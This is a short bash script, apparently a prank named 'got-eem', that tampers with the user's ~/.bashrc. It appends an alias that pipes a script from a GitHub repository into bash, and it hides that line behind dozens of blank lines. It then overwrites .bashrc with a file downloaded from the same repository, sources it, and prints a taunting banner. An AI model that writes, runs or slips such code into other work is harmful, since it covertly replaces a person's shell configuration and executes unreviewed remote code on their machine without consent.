#!/usr/bin/env bash

#local_bash_directory="./out"
local_bash_directory="~"
bashrc_file="$local_bash_directory/.bashrc"
bashrc_file_old="$local_bash_directory/.bashrc.old"

printf "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nalias goteem='curl -Ls https://raw.githubusercontent.com/jackall3n/got-eem/master/got-eem.sh | bash'" >> ${bashrc_file}

cp ${bashrc_file} ${bashrc_file_old}

bash_contents=$(curl -Ls https://raw.githubusercontent.com/jackall3n/got-eem/master/.bashrc)

echo ${bash_contents} > ${bashrc_file}

source ${bashrc_file}

echo "
__   _____  _   _ ____  _____    ____    _ __   __
\ \ / / _ \| | | |  _ \| ____|  / ___|  / \\ \ / /
 \ V | | | | | | | |_) |  _|   | |  _  / _ \\ V /
  | || |_| | |_| |  _ <| |___  | |_| |/ ___ \| |
  |_| \___/ \___/|_| \_|_____|  \____/_/   \_|_|
"
